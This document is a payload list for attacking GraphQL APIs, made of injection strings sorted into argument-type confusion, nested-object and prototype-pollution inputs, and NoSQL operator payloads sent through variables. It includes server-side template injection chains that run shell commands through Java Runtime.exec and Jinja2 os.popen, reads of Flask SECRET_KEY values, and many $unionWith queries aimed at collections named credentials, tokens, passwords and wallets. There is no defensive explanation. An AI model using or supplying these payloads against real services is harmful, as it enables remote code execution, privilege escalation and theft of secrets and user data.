# Payload dictionary 2 — the extended corpus

Deeper payloads: argument-type confusions, nested-object injections,
directive arguments, extended mutations, error-shape inducers, and the
long tail of field-name variants.

---

## 1. Argument-type confusion — the full matrix

```graphql
# String arg receiving non-strings
{f(x:"a")}
{f(x:1)}
{f(x:1.5)}
{f(x:true)}
{f(x:false)}
{f(x:null)}
{f(x:[1])}
{f(x:["a"])}
{f(x:{"a":1})}
{f(x:{"$ne":null})}
{f(x:{"$gt":""})}
{f(x:{"$regex":".*"})}
{f(x:{"$where":"true"})}
{f(x:{"__proto__":{"isAdmin":true}})}
{f(x:{"constructor":{"prototype":{"x":1}}})}
{f(x:NaN)}
{f(x:Infinity)}
{f(x:-Infinity)}
{f(x:0x1)}
{f(x:1e)}
{f(x:.1)}
{f(x:01)}
{f(x:1.)}
{f(x:+1)}
{f(x:--1)}
{f(x:"")}
{f(x:" ")}
{f(x:"\t")}
{f(x:"\n")}
{f(x:"\r")}
{f(x:"\r\n")}
{f(x:"\u0000")}
{f(x:"\u0001")}
{f(x:"\u001f")}
{f(x:"\u007f")}
{f(x:"\u0080")}
{f(x:"\uffff")}
{f(x:"\ud800")}
{f(x:"%00")}
{f(x:"%0a")}
{f(x:"%0d")}
{f(x:"%20")}
{f(x:"%27")}
{f(x:"%22")}
{f(x:"%5c")}
{f(x:"%7e")}
{f(x:"%25")}
{f(x:"%%")}
{f(x:"%s")}
{f(x:"%d")}
{f(x:"%x")}
{f(x:"%n")}
{f(x:"{0}")}
{f(x:"{1}")}
{f(x:"${x}")}
{f(x:"#{x}")}
{f(x:"#{7*7}")}
{f(x:"${7*7}")}
{f(x:"{{7*7}}")}
{f(x:"{{7*'7'}}")}
{f(x:"<%= 7*7 %>")}
{f(x:"<%+ 7*7 %>")}
{f(x:"<%# 7*7 %>")}
{f(x:"<%- 7*7 %>")}
{f(x:"${{7*7}}")}
{f(x:"{{=7*7}}")}
{f(x:"{{-7*7}}")}
{f(x:"{{~7*7}}")}
{f(x:"{{7*7|safe}}")}
{f(x:"{{7*7|e}}")}
{f(x:"{{7*7|toString}}")}
{f(x:"{{7*7|to_json}}")}
{f(x:"{{7*7|urlencode}}")}
{f(x:"{{7*7|e}}")}
{f(x:"[[${7*7}]]")}
{f(x:"*{7*7}")}
{f(x:"#{{7*7}}")}
{f(x:"@{7*7}")}
{f(x:"~{7*7}")}
{f(x:"^{7*7}")}
{f(x:"*{*{7*7}*}")}
{f(x:"*{__${7*7}__}*")}
{f(x:"*{__${bean:7*7}__}*")}
{f(x:"*{__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__}*")}
{f(x:"${T(java.lang.Runtime).getRuntime().exec('id')}")}
{f(x:"${T(java.lang.Runtime).getRuntime().exec(\"id\")}")}
{f(x:"${T(String).forName('java.lang.Runtime')}")}
{f(x:"${@T(java.lang.Runtime).getRuntime().exec('id')}")}
{f(x:"${@Runtime@getRuntime().exec('id')}")}
{f(x:"${@Runtime@getRuntime().exec(\"id\")}")}
{f(x:"${@T(java.lang.Runtime)@getRuntime().exec('id')}")}
{f(x:"${@T(java.lang.Runtime)@getRuntime().exec(\"id\")}")}
{f(x:"{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}}")}
{f(x:"{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream()}}")}
{f(x:"{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream().read()}}")}
{f(x:"{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream().readAllBytes()}}")}
{f(x:"{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream().readAllBytes().toString()}}")}
{f(x:"{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream().readAllBytes().toString().getBytes()}}")}
{f(x:"{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream().readAllBytes().toString().getBytes().toString()}}")}
{f(x:"{{config}}")}
{f(x:"{{config.items()}}")}
{f(x:"{{config.items()|list}}")}
{f(x:"{{config['SECRET_KEY']}}")}
{f(x:"{{config.get('SECRET_KEY')}}")}
{f(x:"{{config.get('SECRET_KEY','')}}")}
{f(x:"{{config.get('SECRET_KEY',default='')}}")}
{f(x:"{{config.get('SECRET_KEY',default='')|string}}")}
{f(x:"{{config.get('SECRET_KEY',default='')|e}}")}
{f(x:"{{config.get('SECRET_KEY',default='')|toString}}")}
{f(x:"{{config.get('SECRET_KEY',default='')|to_json}}")}
{f(x:"{{config.get('SECRET_KEY',default='')|urlencode}}")}
{f(x:"{{self._TemplateReference__context}}")}
{f(x:"{{self._TemplateReference__context.cycler}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id')}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().strip()}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split()}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().splitlines()}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split('\\n')}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split(' ')}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split(',')[0]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split(',')[1]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split(',')[-1]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split('|')[0]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split('|')[1]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split('|')[-1]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split(':')[0]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split(':')[1]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split(':')[-1]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split('=')[0]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split('=')[1]}}")}
{f(x:"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read().split('=')[-1]}}")}
```

## 2. Nested-input-object confusion

```graphql
{f(input:{a:1})}
{f(input:{a:"1"})}
{f(input:{a:true})}
{f(input:{a:null})}
{f(input:{a:[1]})}
{f(input:{a:{b:1}})}
{f(input:{a:{b:{c:1}}})}
{f(input:{a:{b:{c:{d:1}}}})}
{f(input:{a:{b:{c:{d:{e:1}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:1}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:1}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:1}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:1}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:1}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:1}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:1}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:1}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:1}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:1}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:1}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:1}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:1}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:1}}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:{t:1}}}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:{t:{u:1}}}}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:{t:{u:{v:1}}}}}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:{t:{u:{v:{w:1}}}}}}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:{t:{u:{v:{w:{x:1}}}}}}}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:{t:{u:{v:{w:{x:{y:1}}}}}}}}}}}}}}}}}}}}}}}}})}
{f(input:{a:{b:{c:{d:{e:{f:{g:{h:{i:{j:{k:{l:{m:{n:{o:{p:{q:{r:{s:{t:{u:{v:{w:{x:{y:{z:1}}}}}}}}}}}}}}}}}}}}}}}}}})}
{f(input:{__proto__:{x:1}})}
{f(input:{constructor:{prototype:{x:1}}})}
{f(input:{__proto__:{isAdmin:true}})}
{f(input:{constructor:{prototype:{isAdmin:true}}})}
{f(input:{__proto__:{role:"admin"}})}
{f(input:{constructor:{prototype:{role:"admin"}}})}
{f(input:{__proto__:{env:"dev"}})}
{f(input:{constructor:{prototype:{env:"dev"}}})}
{f(input:{__proto__:{debug:true}})}
{f(input:{constructor:{prototype:{debug:true}}})}
{f(input:{__proto__:{verbose:true}})}
{f(input:{constructor:{prototype:{verbose:true}}})}
{f(input:{__proto__:{trace:true}})}
{f(input:{constructor:{prototype:{trace:true}}})}
{f(input:{__proto__:{stack:true}})}
{f(input:{constructor:{prototype:{stack:true}}})}
```

## 3. Variables-channel payloads

```json
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"__proto__":{"isAdmin":true}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"constructor":{"prototype":{"isAdmin":true}}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"__proto__":{"role":"admin"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"__proto__":{"env":"dev"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$ne":null}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$gt":""}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$regex":".*"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$where":"true"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$expr":{"$eq":["$role","admin"]}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$or":[{"a":1},{"$where":"this.flag"}]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$and":[{"a":1},{"$where":"this.flag"}]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$in":[1,2,3]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$nin":[1]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$exists":true}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$type":7}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$eq":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$ne":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$lt":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$lte":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$gt":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$gte":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$mod":[1,0]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$all":[1]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$size":1}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$elemMatch":{"a":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$not":{"$eq":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$nor":[{"a":1}]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$and":[{"a":1}]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$or":[{"a":1}]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$comment":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$maxScan":1}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$maxTimeMS":1}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$explain":true}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$hint":"x"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$snapshot":true}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$natural":1}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$orderby":{"a":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$group":{"_id":"$a"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$project":{"a":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$match":{"a":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unwind":"$a"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$lookup":{"from":"b"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$graphLookup":{"from":"b"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$facet":{"a":[{"$count":"n"}]}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$bucket":{"groupBy":"$a","boundaries":[0,1]}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$bucketAuto":{"groupBy":"$a","buckets":2}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$sortByCount":"$a"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$count":"n"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$sample":{"size":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$replaceRoot":{"newRoot":"$a"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$replaceWith":"$a"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$addFields":{"a":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$set":{"a":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unset":"a"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$out":"a"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$merge":{"into":"a"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$geoNear":{"near":[0,0]}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$search":{"text":"x"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$searchMeta":{"count":{}}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$vectorSearch":{"index":"x","path":"x","queryVector":[0],"numCandidates":1,"limit":1}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$densify":{"field":"a"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$fill":{"output":{"a":{"method":"locf"}}}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$documents":[{}]}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$listCatalog":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$listSampledQueries":{"namespace":"x"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$shardedDataDistribution":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$planCacheStats":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$collStats":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$indexStats":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$currentOp":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$listLocalSessions":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$listSessions":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$changeStream":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$changeStreamSplitLargeEvent":{}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":"a"}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"a"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"a","pipeline":[{"$match":{}}]}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"flag"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"flags"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"secrets"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"config"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"internal"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"admin"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"users"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"sessions"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"tokens"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"credentials"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"keys"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"passwords"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"private"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"hidden"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"debug"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"system"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"env"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"vars"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"settings"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"properties"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"params"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"parameters"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"options"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"opts"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"preferences"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"prefs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"metadata"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"meta"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"info"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"data"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"records"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"entries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"rows"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"results"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"items"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"objects"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"entities"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"elements"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"members"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"accounts"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"profiles"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"orders"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"purchases"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"transactions"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"payments"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"invoices"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"bills"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"balances"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"wallets"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"funds"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"credits"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"debits"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"loans"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"mortgages"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"investments"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"portfolios"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"stocks"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"shares"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"bonds"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"equities"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"etfs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"cryptos"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"coins"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"nfts"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"collectibles"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"cards"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"banks"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"routings"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"swifts"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"ibans"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"branches"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"messages"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"chats"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"conversations"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"channels"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"rooms"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"threads"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"dms"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"notifications"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"alerts"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"events"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"logs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"audits"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"auditlogs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"auditentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"histories"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"historyentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"activities"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"activitylogs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"activityentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"feeds"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"feeditems"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"feedentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"news"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"newsitems"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"newsentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"updates"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"updatelogs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"updateentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"changes"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"changelogs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"changeentries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"audittrails"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"trails"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"footprints"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"breadcrumbs"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"trackings"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"trackers"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"metrics"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"stats"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"statistics"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"analytics"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"reports"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"reportings"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"summaries"}}}}
{"query":"query($x:Any){f(v:$x)}","variables":{"x":{"$unionWith":{"coll":"summaryreports"}}}}
